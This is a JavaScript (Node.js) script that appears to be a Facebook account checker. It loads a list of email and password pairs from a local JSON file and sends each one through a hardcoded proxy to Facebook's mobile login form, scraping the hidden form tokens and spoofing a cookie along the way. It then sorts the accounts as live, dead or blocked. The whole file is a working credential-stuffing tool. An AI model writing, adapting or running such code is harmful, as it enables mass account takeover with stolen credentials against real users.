const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const jsdom = require('jsdom');
const { JSDOM } = jsdom;
const fs = require('fs')
  const proxyAgent = new HttpsProxyAgent(`http://24.199.92.238:12003`);
 
  const axiosInstance = axios.create({
    httpsAgent: proxyAgent,
    withCredentials: true
  });

async function getValue(dom,acc,pass){
    const lsd = await dom.window.document.querySelector('input[name="lsd"]').value;
    const jazoest =await dom.window.document.querySelector('input[name="jazoest"]').value;
    const m_ts = await dom.window.document.querySelector('input[name="m_ts"]').value;
    const li = await dom.window.document.querySelector('input[name="li"]').value;
    const try_number = await dom.window.document.querySelector('input[name="try_number"]').value;
    const unrecognized_tries = await dom.window.document.querySelector('input[name="unrecognized_tries"]').value;
    const login = await dom.window.document.querySelector('input[name="login"]').value;
    const bi_xrwh = await dom.window.document.getElementById('bi_xrwh').value;
    
    const payload= {
        "lsd":lsd,
        "jazoest":jazoest,
        "m_ts":m_ts,
        "li":li,
        "try_number":"0",
        "unrecognized_tries":"0",
        "email":acc,
        "pass":pass,
        "login":login,
        "bi_xrwh":"0"
      }
    return payload
}



const getHtmlCookie =async (axiosModify,item,type) =>{
  const urlCookie = "https://mbasic.facebook.com/login"
    const option = {
    headers:{
      accept: `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
      cookie:'datr=d2dHZOgnIUtcsKuPo7wiblBV',
      "accept-language": `en-US,en;q=0.9`,
      // "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
    }
  }
  const cookieDatr = 'datr=d2dHZOgnIUtcsKuPo7wiblBV'
  const siteCookie = await axiosModify.get(urlCookie,option)
  console.log("html",siteCookie)
  const dom = new JSDOM(siteCookie.data)
  const isBlock = await dom.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
  if(isBlock){
    console.log("block gethtml")
  }
  var cookies
    const cookieSd = siteCookie.headers['set-cookie'][0].split(";")[0]
    cookies = cookieDatr + ";" + cookieSd
  
 
  const userAgent = siteCookie.config.headers['User-Agent']
  const lsd = await dom.window.document.querySelector('input[name="lsd"]').value;
  const jazoest =await dom.window.document.querySelector('input[name="jazoest"]').value;
  const m_ts = await dom.window.document.querySelector('input[name="m_ts"]').value;
  const li = await dom.window.document.querySelector('input[name="li"]').value;
  const try_number = await dom.window.document.querySelector('input[name="try_number"]').value;
  const unrecognized_tries = await dom.window.document.querySelector('input[name="unrecognized_tries"]').value;
  const login = await dom.window.document.querySelector('input[name="login"]').value;
  const bi_xrwh = await dom.window.document.getElementById('bi_xrwh').value;
      
      const payload= {
          "lsd":lsd,
          "jazoest":jazoest,
          "m_ts":m_ts,
          "li":li,
          "try_number":"0",
          "unrecognized_tries":"0",
          "email":item.email,
          "pass":item.password,
          "login":login,
          "bi_xrwh":"0"
        }
  return {payload,cookies,siteCookie,userAgent}
}

const postCookie = async(payload,cookies,axiosModify,userAgent)=>{
  const urlPost = "https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8"

  const res = await axiosModify.post(urlPost,payload,{
    headers:{
      'origin':`https://mbasic.facebook.com`,
      'content-type': `application/x-www-form-urlencoded`,
      "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7`,
      'referer': 'https://mbasic.facebook.com/',
      "cookie": cookies,
      "accept-language": `en-US,en;q=0.9`,
      // "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
    }
  })
  return res
}

const main =async (item) =>{
  const {payload,cookies,siteCookie,userAgent} = await getHtmlCookie(axiosInstance,item,'')
  console.log(cookies)
  const res = await postCookie(payload,cookies,axiosInstance,userAgent)
  const dom = new JSDOM(res.data)
  const die = await dom.window.document.querySelector('#login_error .p') ? await dom.window.document.querySelector('#login_error .p').innerHTML :''
  const live = await dom.window.document.querySelector('table span.s') ? await dom.window.document.querySelector('table span.s').innerHTML :''
  const block = await dom.window.document.querySelector('div [title="You’re Temporarily Blocked"]')
  if(live){
    console.log('live')
  }else if(die == 'Invalid username or password'){
    console.log('die')
  }else if(block)
  {
    console.log("Block")
  }else {
    console.log('erro',res.data)
  }
}



const checkFor = async () =>{
  const data = await fs.readFileSync(`newData10.json`, { encoding: 'utf-8' });
  const list = JSON.parse(data)
  let i =0
  while(i<list.length)
  {
    await main(list[i])
    await i++
  }
  
}
checkFor()